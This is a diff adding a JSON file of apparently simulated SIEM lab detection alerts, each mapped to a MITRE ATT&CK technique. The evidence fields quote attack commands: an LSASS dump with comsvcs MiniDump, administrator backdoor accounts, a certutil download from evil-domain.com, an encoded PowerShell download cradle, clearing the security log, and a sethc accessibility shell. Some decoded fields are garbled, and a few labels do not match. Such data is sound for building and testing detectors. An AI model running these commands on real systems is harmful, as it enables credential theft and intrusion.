@@ -1,0 +1,287 @@
+[
+  {
+    "Timestamp": "2026-05-29T16:15:11.7741296+01:00",
+    "DetectionType": "User Account Created",
+    "MITRE_ID": "T1136.001",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "SYSTEM",
+    "Description": "A new local or domain operating system account was provisioned on the host.",
+    "Evidence": {
+      "ProcessId": null,
+      "TargetUser": null,
+      "EventID": 4720
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:21:01.7741296+01:00",
+    "DetectionType": "User Account Created",
+    "MITRE_ID": "T1136.001",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "SYSTEM",
+    "Description": "A new local or domain operating system account was provisioned on the host.",
+    "Evidence": {
+      "ProcessId": null,
+      "TargetUser": null,
+      "EventID": 4720
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:26:51.7741296+01:00",
+    "DetectionType": "User Account Created",
+    "MITRE_ID": "T1136.001",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "SYSTEM",
+    "Description": "A new local or domain operating system account was provisioned on the host.",
+    "Evidence": {
+      "ProcessId": null,
+      "TargetUser": null,
+      "EventID": 4720
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:14:36.7741296+01:00",
+    "RuleName": "Detect-SecurityGroupModified",
+    "MitreTechnique": "T1098",
+    "TargetUser": true,
+    "HostingComputer": "SIEM-LAB-LAPTOP04",
+    "Evidence": "High-value administrative group structure changed: Group Target: Administrators. Trace context: net localgroup administrators backdoor_admin_23 /add",
+    "TimeDetected": "2026-05-29T16:28:01.90353+01:00",
+    "Severity": "High"
+  },
+  {
+    "Timestamp": "2026-05-29T16:20:26.7741296+01:00",
+    "RuleName": "Detect-SecurityGroupModified",
+    "MitreTechnique": "T1098",
+    "TargetUser": true,
+    "HostingComputer": "SIEM-LAB-LAPTOP04",
+    "Evidence": "High-value administrative group structure changed: Group Target: Administrators. Trace context: net localgroup administrators backdoor_admin_13 /add",
+    "TimeDetected": "2026-05-29T16:28:01.9041726+01:00",
+    "Severity": "High"
+  },
+  {
+    "Timestamp": "2026-05-29T16:26:16.7741296+01:00",
+    "RuleName": "Detect-SecurityGroupModified",
+    "MitreTechnique": "T1098",
+    "TargetUser": true,
+    "HostingComputer": "SIEM-LAB-LAPTOP04",
+    "Evidence": "High-value administrative group structure changed: Group Target: Administrators. Trace context: net localgroup administrators backdoor_admin_3 /add",
+    "TimeDetected": "2026-05-29T16:28:01.9045294+01:00",
+    "Severity": "High"
+  },
+  {
+    "Timestamp": "2026-05-29T16:11:06.7741296+01:00",
+    "RuleName": "Detect-LsassHandleRequest",
+    "MitreTechnique": "T1003.001",
+    "TargetUser": "SYSTEM",
+    "HostingComputer": "SIEM-LAB-SRV01",
+    "Evidence": "Process creation pattern matches LSASS memory harvest execution string: rundll32.exe comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full",
+    "TimeDetected": "2026-05-29T16:28:01.9323865+01:00",
+    "Severity": "High"
+  },
+  {
+    "Timestamp": "2026-05-29T16:16:56.7741296+01:00",
+    "RuleName": "Detect-LsassHandleRequest",
+    "MitreTechnique": "T1003.001",
+    "TargetUser": "SYSTEM",
+    "HostingComputer": "SIEM-LAB-SRV01",
+    "Evidence": "Process creation pattern matches LSASS memory harvest execution string: rundll32.exe comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full",
+    "TimeDetected": "2026-05-29T16:28:01.9327537+01:00",
+    "Severity": "High"
+  },
+  {
+    "Timestamp": "2026-05-29T16:22:46.7741296+01:00",
+    "RuleName": "Detect-LsassHandleRequest",
+    "MitreTechnique": "T1003.001",
+    "TargetUser": "SYSTEM",
+    "HostingComputer": "SIEM-LAB-SRV01",
+    "Evidence": "Process creation pattern matches LSASS memory harvest execution string: rundll32.exe comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full",
+    "TimeDetected": "2026-05-29T16:28:01.9330556+01:00",
+    "Severity": "High"
+  },
+  {
+    "Timestamp": "2026-05-29T16:12:16.7741296+01:00",
+    "RuleName": "Detect-AccessibilityFeatureAbuse",
+    "MitreTechnique": "T1546.015",
+    "TargetUser": "SYSTEM",
+    "HostingComputer": "SIEM-LAB-WKSTN03",
+    "Evidence": "Exploitation trace: Accessibility binary execution associated with shell environment runtime: sethc.exe spawn cmd.exe",
+    "TimeDetected": "2026-05-29T16:28:01.953573+01:00",
+    "Severity": "Critical"
+  },
+  {
+    "Timestamp": "2026-05-29T16:18:06.7741296+01:00",
+    "RuleName": "Detect-AccessibilityFeatureAbuse",
+    "MitreTechnique": "T1546.015",
+    "TargetUser": "SYSTEM",
+    "HostingComputer": "SIEM-LAB-WKSTN03",
+    "Evidence": "Exploitation trace: Accessibility binary execution associated with shell environment runtime: sethc.exe spawn cmd.exe",
+    "TimeDetected": "2026-05-29T16:28:01.9539211+01:00",
+    "Severity": "Critical"
+  },
+  {
+    "Timestamp": "2026-05-29T16:23:56.7741296+01:00",
+    "RuleName": "Detect-AccessibilityFeatureAbuse",
+    "MitreTechnique": "T1546.015",
+    "TargetUser": "SYSTEM",
+    "HostingComputer": "SIEM-LAB-WKSTN03",
+    "Evidence": "Exploitation trace: Accessibility binary execution associated with shell environment runtime: sethc.exe spawn cmd.exe",
+    "TimeDetected": "2026-05-29T16:28:01.954133+01:00",
+    "Severity": "Critical"
+  },
+  {
+    "Timestamp": "2026-05-29T16:14:01.7741296+01:00",
+    "DetectionType": "Suspicious Scheduled Task Registration",
+    "MITRE_ID": "T1053.005",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "Description": "A new scheduled task was registered pointing to an untrusted file system environment or using deceptive naming schemas.",
+    "Evidence": {
+      "ProcessId": null,
+      "TaskName": "\\Microsoft\\Windows\\CriticalUpdate\\UpdateAgent_24",
+      "EventID": 106,
+      "TaskPath": "C:\\Windows\\Temp\\beacon.exe"
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:19:51.7741296+01:00",
+    "DetectionType": "Suspicious Scheduled Task Registration",
+    "MITRE_ID": "T1053.005",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "Description": "A new scheduled task was registered pointing to an untrusted file system environment or using deceptive naming schemas.",
+    "Evidence": {
+      "ProcessId": null,
+      "TaskName": "\\Microsoft\\Windows\\CriticalUpdate\\UpdateAgent_14",
+      "EventID": 106,
+      "TaskPath": "C:\\Windows\\Temp\\beacon.exe"
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:25:41.7741296+01:00",
+    "DetectionType": "Suspicious Scheduled Task Registration",
+    "MITRE_ID": "T1053.005",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "Description": "A new scheduled task was registered pointing to an untrusted file system environment or using deceptive naming schemas.",
+    "Evidence": {
+      "ProcessId": null,
+      "TaskName": "\\Microsoft\\Windows\\CriticalUpdate\\UpdateAgent_4",
+      "EventID": 106,
+      "TaskPath": "C:\\Windows\\Temp\\beacon.exe"
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:10:31.7741296+01:00",
+    "DetectionType": "Obfuscated PowerShell Execution",
+    "MITRE_ID": "T1027",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Inioluwa",
+    "Description": "An obfuscated base64 PowerShell execution sequence was identified and automatically decoded by the platform.",
+    "Evidence": {
+      "DecodedCommand": "Write-Host 'Threat Hunting Live!'\u000f",
+      "ProcessName": "powershell.exe",
+      "RawCommandLine": "powershell.exe -Letter -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABoAHIAZQBhAHQAIABIAHUAbgB0AGkAbgBnACAATABpAHYAZQAhACcADwA=",
+      "ParentProcess": "cmd.exe",
+      "ExtractedBase64": "VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABoAHIAZQBhAHQAIABIAHUAbgB0AGkAbgBnACAATABpAHYAZQAhACcADwA="
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:16:21.7741296+01:00",
+    "DetectionType": "Obfuscated PowerShell Execution",
+    "MITRE_ID": "T1027",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Sarah.Jenkins",
+    "Description": "An obfuscated base64 PowerShell execution sequence was identified and automatically decoded by the platform.",
+    "Evidence": {
+      "DecodedCommand": "敩⁸丨睥伭橢捥⁴敎⹴敗䍢楬湥⥴䐮睯汮慯卤牴湩⡧栧瑴㩰⼯慢杣潯⹲硥❥�",
+      "ProcessName": "powershell.exe",
+      "RawCommandLine": "powershell.exe -EncodedCommand aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFjZ29vci5leGUnKQ==",
+      "ParentProcess": "cmd.exe",
+      "ExtractedBase64": "aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFjZ29vci5leGUnKQ=="
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:22:11.7741296+01:00",
+    "DetectionType": "Obfuscated PowerShell Execution",
+    "MITRE_ID": "T1027",
+    "Severity": "Low",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Emily.Davis",
+    "Description": "An obfuscated base64 PowerShell execution sequence was identified and automatically decoded by the platform.",
+    "Evidence": {
+      "DecodedCommand": "汃慥⵲癅湥䱴杯ⴠ敓畣楲祴",
+      "ProcessName": "powershell.exe",
+      "RawCommandLine": "powershell.exe -e Q2xlYXItRXZlbnRMb2cgLVNlY3VyaXR5",
+      "ParentProcess": "cmd.exe",
+      "ExtractedBase64": "Q2xlYXItRXZlbnRMb2cgLVNlY3VyaXR5"
+    }
+  },
+  {
+    "Timestamp": "2026-05-29T16:12:51.7741296+01:00",
+    "RuleName": "Detect-LivingOffTheLandBinaries",
+    "MitreTechnique": "T1105",
+    "TargetUser": "Sarah.Jenkins",
+    "HostingComputer": "SIEM-LAB-WKSTN02",
+    "Evidence": "Native administrative OS binary utilized to execute file ingress cradle requests: certutil.exe -urlcache -split -f http://evil-domain.com/malware.exe C:\\Windows\\Temp\\payload.exe",
+    "TimeDetected": "2026-05-29T16:28:01.9929459+01:00",
+    "Severity": "Medium"
+  },
+  {
+    "Timestamp": "2026-05-29T16:18:41.7741296+01:00",
+    "RuleName": "Detect-LivingOffTheLandBinaries",
+    "MitreTechnique": "T1105",
+    "TargetUser": "Emily.Davis",
+    "HostingComputer": "SIEM-LAB-WKSTN02",
+    "Evidence": "Native administrative OS binary utilized to execute file ingress cradle requests: certutil.exe -urlcache -split -f http://evil-domain.com/malware.exe C:\\Windows\\Temp\\payload.exe",
+    "TimeDetected": "2026-05-29T16:28:01.9932157+01:00",
+    "Severity": "Medium"
+  },
+  {
+    "Timestamp": "2026-05-29T16:24:31.7741296+01:00",
+    "RuleName": "Detect-LivingOffTheLandBinaries",
+    "MitreTechnique": "T1105",
+    "TargetUser": "Inioluwa",
+    "HostingComputer": "SIEM-LAB-WKSTN02",
+    "Evidence": "Native administrative OS binary utilized to execute file ingress cradle requests: certutil.exe -urlcache -split -f http://evil-domain.com/malware.exe C:\\Windows\\Temp\\payload.exe",
+    "TimeDetected": "2026-05-29T16:28:01.9934302+01:00",
+    "Severity": "Medium"
+  },
+  {
+    "Timestamp": "2026-05-29T16:13:26.7741296+01:00",
+    "RuleName": "Detect-ProcessHollowing",
+    "MitreTechnique": "T1036.005",
+    "TargetUser": "James.Doe",
+    "HostingComputer": "SIEM-LAB-WKSTN01",
+    "Evidence": "Critical system process execution originating from rogue root workspace: Process: svchost.exe Cmd: C:\\Users\\Public\\Downloads\\svchost.exe --port 4444",
+    "TimeDetected": "2026-05-29T16:28:02.0663071+01:00",
+    "Severity": "Critical"
+  },
+  {
+    "Timestamp": "2026-05-29T16:19:16.7741296+01:00",
+    "RuleName": "Detect-ProcessHollowing",
+    "MitreTechnique": "T1036.005",
+    "TargetUser": "David.Miller",
+    "HostingComputer": "SIEM-LAB-WKSTN01",
+    "Evidence": "Critical system process execution originating from rogue root workspace: Process: svchost.exe Cmd: C:\\Users\\Public\\Downloads\\svchost.exe --port 4444",
+    "TimeDetected": "2026-05-29T16:28:02.0664928+01:00",
+    "Severity": "Critical"
+  },
+  {
+    "Timestamp": "2026-05-29T16:25:06.7741296+01:00",
+    "RuleName": "Detect-ProcessHollowing",
+    "MitreTechnique": "T1036.005",
+    "TargetUser": "John.Smith",
+    "HostingComputer": "SIEM-LAB-WKSTN01",
+    "Evidence": "Critical system process execution originating from rogue root workspace: Process: svchost.exe Cmd: C:\\Users\\Public\\Downloads\\svchost.exe --port 4444",
+    "TimeDetected": "2026-05-29T16:28:02.066614+01:00",
+    "Severity": "Critical"
+  }
+]
